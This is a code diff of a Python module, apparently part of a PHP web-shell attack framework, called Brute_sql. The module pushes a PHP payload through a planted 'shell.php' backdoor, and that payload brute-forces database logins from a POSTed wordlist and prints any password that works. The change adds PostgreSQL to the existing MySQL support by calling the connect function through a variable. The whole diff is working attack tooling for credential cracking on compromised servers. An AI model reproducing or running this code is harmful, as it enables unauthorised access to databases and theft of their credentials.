@@ -17,9 +17,9 @@ class Brute_sql(Module):
     '''
     
     vectors = VectorList([
-            Vector('shell.php', 'brute_mysql_php', """$h="%s"; $u="%s"; $w=$_POST["%s"]; 
+            Vector('shell.php', 'brute_mysql_php', """$m="%s"; $h="%s"; $u="%s"; $w=$_POST["%s"]; 
 foreach(split('[\n]+',$w) as $pwd) {
-if(@mysql_connect($h, $u, $pwd)){
+if(@$m($h, $u, $pwd)){
     print("+" . $u . ":" . $pwd . "\n");
     break;
 }
@@ -37,8 +37,12 @@ if(@mysql_connect($h, $u, $pwd)){
         
     def run( self, mode, host, user, filename, start_line):
 
-        if mode != 'mysql':
-            raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
+        if mode == 'mysql':
+            sql_connect = "mysql_connect"
+        elif mode == 'postgres':
+            sql_connect = "pg_connect"
+        else:
+            raise ModuleException(self.name,  "Database '%s' unsupported" % (mode))
 
         if start_line == 'all':
             start_line = 0
@@ -56,14 +60,14 @@ if(@mysql_connect($h, $u, $pwd)){
 
         vector = self._get_default_vector2()
         if vector:
-            response = self.__execute_payload(vector, [host, user, rand_post_name, start_line, wl_splitted])
+            response = self.__execute_payload(vector, [sql_connect, host, user, rand_post_name, start_line, wl_splitted])
             if response != None:
                 self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                 return response
             
         vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         for vector in vectors:
-            response = self.__execute_payload(vector, [host, user, rand_post_name, start_line, wl_splitted])
+            response = self.__execute_payload(vector, [sql_connect, host, user, rand_post_name, start_line, wl_splitted])
             if response != None:
                 self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                 return response
@@ -71,9 +75,9 @@ if(@mysql_connect($h, $u, $pwd)){
         
     def __execute_payload(self, vector, parameters):
         
-        rand_post_name = parameters[2]
-        start_line = int(parameters[3])
-        wl = parameters[4][start_line:]
+        rand_post_name = parameters[3]
+        start_line = int(parameters[4])
+        wl = parameters[5][start_line:]
         
         chunks = int(ceil(len(wl)/self.chunksize))
         
@@ -96,7 +100,7 @@ if(@mysql_connect($h, $u, $pwd)){
                 if response.startswith('+'):
                     return "[%s] FOUND %s" % (self.name,response[1:])
             else:
-                self.mprint("[%i] %s:%s " % (endword+start_line, parameters[1], wl[endword]))
+                self.mprint("[%i] %s:%s " % (endword+start_line, parameters[2], wl[endword]))
 
 
     def __prepare_payload( self, vector, parameters ):
